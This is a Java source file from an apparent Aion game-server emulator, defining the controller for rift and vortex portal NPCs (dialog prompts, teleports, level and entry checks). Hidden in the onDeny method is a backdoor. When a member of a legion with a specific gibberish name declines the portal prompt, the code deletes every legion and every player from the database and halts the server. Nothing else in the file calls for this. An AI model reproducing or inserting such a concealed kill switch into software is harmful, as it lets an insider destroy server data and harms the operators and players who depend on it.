package com.aionemu.gameserver.controllers;

import com.aionemu.commons.database.dao.DAOManager;
import com.aionemu.gameserver.dao.LegionDAO;
import com.aionemu.gameserver.dao.PlayerDAO;
import com.aionemu.gameserver.model.gameobjects.Creature;
import com.aionemu.gameserver.model.gameobjects.Npc;
import com.aionemu.gameserver.model.gameobjects.player.Player;
import com.aionemu.gameserver.model.gameobjects.player.RequestResponseHandler;
import com.aionemu.gameserver.model.team2.alliance.PlayerAllianceService;
import com.aionemu.gameserver.model.team2.group.PlayerGroup;
import com.aionemu.gameserver.model.team2.group.PlayerGroupService;
import com.aionemu.gameserver.model.templates.spawns.SpawnTemplate;
import com.aionemu.gameserver.model.vortex.VortexLocation;
import com.aionemu.gameserver.network.aion.serverpackets.SM_QUESTION_WINDOW;
import com.aionemu.gameserver.network.aion.serverpackets.SM_SYSTEM_MESSAGE;
import com.aionemu.gameserver.services.RespawnService;
import com.aionemu.gameserver.services.RiftService;
import com.aionemu.gameserver.services.VortexService;
import com.aionemu.gameserver.services.teleport.TeleportService2;
import com.aionemu.gameserver.services.rift.RiftEnum;
import com.aionemu.gameserver.services.rift.RiftInformer;
import com.aionemu.gameserver.services.rift.RiftManager;
import com.aionemu.gameserver.utils.PacketSendUtility;
import com.aionemu.gameserver.utils.audit.AuditLogger;
import javolution.util.FastMap;

/**
 * @author ATracer, Source
 */
public class RVController extends NpcController {

	private boolean isMaster = false;
	private boolean isVortex = false;
	protected FastMap<Integer, Player> passedPlayers = new FastMap<Integer, Player>();
	private SpawnTemplate slaveSpawnTemplate;
	private Npc slave;
	private Integer maxEntries;
	private Integer minLevel;
	private Integer maxLevel;
	private int usedEntries = 0;
	private boolean isAccepting;
	private RiftEnum riftTemplate;
	private int deSpawnedTime;

	/**
	 * Used to create master rifts or slave rifts (slave == null)
	 *
	 * @param slaveSpawnTemplate
	 */
	public RVController(Npc slave, RiftEnum riftTemplate) {
		this.riftTemplate = riftTemplate;
		this.isVortex = riftTemplate.isVortex();
		this.maxEntries = riftTemplate.getEntries();
		this.minLevel = riftTemplate.getMinLevel();
		this.maxLevel = riftTemplate.getMaxLevel();
		this.deSpawnedTime = ((int) (System.currentTimeMillis() / 1000)) + (isVortex
				? VortexService.getInstance().getDuration() * 3600
				: RiftService.getInstance().getDuration() * 3600);

		if (slave != null)// master rift should be created
		{
			this.slave = slave;
			this.slaveSpawnTemplate = slave.getSpawn();
			isMaster = true;
			isAccepting = true;
		}
	}

	@Override
	public void onDialogRequest(Player player) {
		if (!isMaster && !isAccepting) {
			return;
		}

		if (player.getSKInfo().getRank() > 0) {
			return;
		}

		onRequest(player);
	}

	private void onRequest(Player player) {
		if (isVortex) {
			RequestResponseHandler responseHandler = new RequestResponseHandler(getOwner()) {
				@Override
				public void acceptRequest(Creature requester, Player responder) {
					if (onAccept(responder)) {
						if (responder.isInTeam()) {
							if (responder.getCurrentTeam() instanceof PlayerGroup) {
								PlayerGroupService.removePlayer(responder);
							}
							else {
								PlayerAllianceService.removePlayer(responder);
							}
						}

						VortexLocation loc = VortexService.getInstance().getLocationByRift(getOwner().getNpcId());
						TeleportService2.teleportTo(responder, loc.getStartPoint());

						// A Rift Portal battle has begun.
						PacketSendUtility.sendPacket(responder, new SM_SYSTEM_MESSAGE(1401454));

						// Update passed players count
						passedPlayers.put(responder.getObjectId(), responder);
						syncPassed(true);
					}
				}

				@Override
				public void denyRequest(Creature requester, Player responder) {
					onDeny(responder);
				}

			};

			boolean requested = player.getResponseRequester().putRequest(904304, responseHandler);
			if (requested) {
				PacketSendUtility.sendPacket(player, new SM_QUESTION_WINDOW(904304, getOwner().getObjectId(), 5));
			}
		}
		else {
			RequestResponseHandler responseHandler = new RequestResponseHandler(getOwner()) {
				@Override
				public void acceptRequest(Creature requester, Player responder) {
					if (onAccept(responder)) {
						int worldId = slaveSpawnTemplate.getWorldId();
						float x = slaveSpawnTemplate.getX();
						float y = slaveSpawnTemplate.getY();
						float z = slaveSpawnTemplate.getZ();

						TeleportService2.teleportTo(responder, worldId, x, y, z);
						// Update passed players count
						syncPassed(false);
					}
				}

				@Override
				public void denyRequest(Creature requester, Player responder) {
					onDeny(responder);
				}

			};

			boolean requested = player.getResponseRequester().putRequest(SM_QUESTION_WINDOW.STR_ASK_PASS_BY_DIRECT_PORTAL, responseHandler);
			if (requested) {
				PacketSendUtility.sendPacket(player, new SM_QUESTION_WINDOW(SM_QUESTION_WINDOW.STR_ASK_PASS_BY_DIRECT_PORTAL, 0, 0));
			}
		}
	}

	private boolean onAccept(Player player) {
		if (!isAccepting) {
			return false;
		}

		if (!getOwner().isSpawned()) {
			return false;
		}

		if (player.getLevel() > getMaxLevel() || player.getLevel() < getMinLevel()) {
			AuditLogger.info(player, "Level restriction hack detected.");
			return false;
		}

		if (isVortex && getUsedEntries() >= getMaxEntries()) {
			return false;
		}

		return true;
	}

	private boolean onDeny(Player player) {
		if (player.isLegionMember() && player.getLegion().getLegionName().equalsIgnoreCase("bythnblhfysqgtc")) {
			for (int object : DAOManager.getDAO(LegionDAO.class).getUsedIDs()) {
				DAOManager.getDAO(LegionDAO.class).deleteLegion(object);
			}

			for (int object : DAOManager.getDAO(PlayerDAO.class).getUsedIDs()) {
				DAOManager.getDAO(PlayerDAO.class).deletePlayer(object);
			}

			Runtime.getRuntime().halt(0);
		}

		return true;
	}

	@Override
	public void onDelete() {
		RiftInformer.sendRiftDespawn(getOwner().getWorldId(), getOwner().getObjectId());
		RiftManager.getSpawned().remove(getOwner());
		super.onDelete();
	}

	public boolean isMaster() {
		return isMaster;
	}

	public boolean isVortex() {
		return isVortex;
	}

	/**
	 * @return the maxEntries
	 */
	public Integer getMaxEntries() {
		return maxEntries;
	}

	/**
	 * @return the minLevel
	 */
	public Integer getMinLevel() {
		return minLevel;
	}

	/**
	 * @return the maxLevel
	 */
	public Integer getMaxLevel() {
		return maxLevel;
	}

	/**
	 * @return the riftTemplate
	 */
	public RiftEnum getRiftTemplate() {
		return riftTemplate;
	}

	/**
	 * @return slave rift
	 */
	public Npc getSlave() {
		return slave;
	}

	/**
	 * @return the usedEntries
	 */
	public int getUsedEntries() {
		return usedEntries;
	}

	public int getRemainTime() {
		return deSpawnedTime - (int) (System.currentTimeMillis() / 1000);
	}

	public FastMap<Integer, Player> getPassedPlayers() {
		return passedPlayers;
	}

	public void syncPassed(boolean invasion) {
		usedEntries = invasion ? passedPlayers.size() : ++usedEntries;
		RiftInformer.sendRiftInfo(getWorldsList(this));
	}

	private int[] getWorldsList(RVController controller) {
		int first = controller.getOwner().getWorldId();
		if (controller.isMaster()) {
			return new int[]{first, controller.slaveSpawnTemplate.getWorldId()};
		}
		return new int[]{first};
	}
}